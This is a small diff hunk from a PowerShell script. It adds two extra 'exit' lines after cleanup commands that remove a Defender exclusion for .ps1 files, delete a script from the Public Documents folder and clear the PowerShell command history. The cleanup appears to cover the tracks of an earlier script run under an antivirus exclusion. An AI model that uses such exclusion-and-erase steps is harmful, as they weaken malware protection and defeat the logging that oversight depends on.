@@ -13,3 +13,5 @@ Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
 Remove-Item C:\Users\Public\Documents\script.ps1 #Delete script.ps1 file
 Clear-Content (Get-PSReadLineOption).HistorySavePath #Clear powershell command history
 exit
+exit
+exit
